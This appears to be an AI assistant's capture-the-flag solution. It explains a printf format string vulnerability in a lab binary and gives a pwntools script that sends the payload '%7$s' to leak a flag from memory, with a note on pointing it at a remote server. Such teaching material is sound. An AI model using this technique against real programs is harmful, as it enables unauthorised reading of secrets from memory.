To solve this challenge using `pwntools`, you can exploit the format string vulnerability present in the program. The vulnerability lies in the `printf(format)` call, where user-controlled input (`format`) is directly passed to `printf` without proper sanitization. This allows you to perform arbitrary memory reads and potentially write to memory if the binary is not protected by certain mitigations.

Here are the steps to solve the challenge:

### Steps to Solve the Challenge

1. **Analyze the Binary**:
   - The binary reads the flag from `flag.txt` into the `v10` buffer.
   - It then asks the user for input and compares the input with the flag.
   - If the input doesn't match the flag, it prints the user input using `printf(format)`, which is vulnerable to a format string attack.

2. **Exploit the Format String Vulnerability**:
   - Use the format string vulnerability to leak the contents of the `v10` buffer (which contains the flag).
   - The `%s` or `%p` format specifiers can be used to read memory addresses.

3. **Write the Exploit Script**:
   - Use `pwntools` to interact with the binary.
   - Craft a payload to exploit the format string vulnerability and leak the flag.

4. **Run the Exploit**:
   - Execute the script to retrieve the flag.

### Exploit Code Using `pwntools`

Here is the Python exploit script:

```python
from pwn import *

# Set up the binary and context
binary = './fmt'  # Path to the binary
context.binary = binary
elf = ELF(binary)

# Start the process (or connect to remote if applicable)
p = process(binary)

# Interact with the binary
p.recvuntil("what's the flag\n")  # Wait for the prompt

# Craft the payload to leak the flag
# Use %p to leak memory addresses, or %s if you know the address of the flag buffer
payload = b"%7$s"  # Assuming the flag buffer is at the 7th argument on the stack

# Send the payload
p.sendline(payload)

# Receive the output
response = p.recvall()

# Extract the flag from the response
print("Flag:", response.decode(errors='ignore'))
```

### Explanation of the Code

1. **Binary Setup**:
   - The binary is loaded using `pwntools`' `ELF` module for analysis.
   - The `process` function is used to run the binary locally.

2. **Payload Construction**:
   - The `%7$s` format specifier is used to read the 7th argument on the stack as a string. This is a common offset for user input in format string vulnerabilities, but you may need to adjust it based on the stack layout of the binary.

3. **Interaction**:
   - The script waits for the prompt (`what's the flag`) and sends the crafted payload.

4. **Flag Extraction**:
   - The response from the binary is captured and decoded to extract the flag.

---

### Notes

- The exact offset (`%7$s`) may vary depending on the binary's stack layout. You can use `%p` to print multiple stack addresses and determine the correct offset for the flag buffer.
- If the binary is running on a remote server, replace `process(binary)` with `remote('host', port)` to connect to the server.
- Ensure that the `flag.txt` file is present in the same directory as the binary when testing locally.

### Example Output

If the flag is `CTF{example_flag}`, the script will output:

```
Flag: CTF{example_flag}
```
